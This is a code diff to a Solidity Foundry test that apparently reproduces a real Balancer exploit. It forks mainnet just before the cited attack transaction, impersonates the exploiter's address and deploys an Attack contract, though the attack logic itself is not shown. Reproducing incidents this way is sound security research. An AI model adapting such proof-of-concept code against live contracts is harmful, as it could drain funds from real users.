@@ -69,14 +69,16 @@ interface Ivault {
         );
     function manageUserBalance(UserBalanceOp[] memory ops) external payable;
 }
+
+// @note https://etherscan.io/tx/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569
 contract BalancerPoC is Test {
     function setUp() public {
-        vm.createSelectFork("mainnet");
+        vm.createSelectFork("mainnet", 23717404 - 1);
     }
     function testExploit() public {
         address exploiter = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
         address CA = 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d;
-        vm.rollFork(23717404 - 1);
+
         vm.startPrank(exploiter);
         Attack tmp = new Attack();
         bytes memory code = address(tmp).code;
